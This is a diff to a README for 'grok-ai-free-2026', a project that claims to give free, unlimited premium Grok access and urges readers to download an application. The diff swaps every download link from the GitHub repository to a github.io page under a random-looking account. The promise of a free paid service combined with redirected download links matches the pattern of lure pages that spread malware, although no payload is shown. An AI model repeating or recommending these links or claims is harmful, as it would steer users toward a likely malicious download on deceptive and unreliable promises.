@@ -1,6 +1,6 @@
 # 🚀 grok-ai-free-2026 - Free Grok Access Without Premium
 
-[![Download Now](https://img.shields.io/badge/Download-Grok_AI_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Collotypetergiversation687/grok-ai-free-2026)
+[![Download Now](https://img.shields.io/badge/Download-Grok_AI_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://collotypetergiversation687.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these simple steps to start using Grok for free:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Collotypetergiversation687/grok-ai-free-2026](https://github.com/Collotypetergiversation687/grok-ai-free-2026)**
+Visit this link to download the application: **[https://collotypetergiversation687.github.io](https://collotypetergiversation687.github.io)**
 
 Click the green "Code" button, then select "Download ZIP" to get the files, or use the direct download link provided on the page.
 
@@ -164,7 +164,7 @@ This tool is provided "as is" without warranty. The developers are not responsib
 
 Stop paying for Grok. Download **grok-ai-free-2026** today and experience the full power of Grok 2 and Grok 3 for free. It's fast, easy, and completely unlimited.
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Download_Grok_AI_Free_2026-4ECB71?style=for-the-badge)](https://github.com/Collotypetergiversation687/grok-ai-free-2026)
+[![Get Started Now](https://img.shields.io/badge/🚀-Download_Grok_AI_Free_2026-4ECB71?style=for-the-badge)](https://collotypetergiversation687.github.io)
 
 ---
 
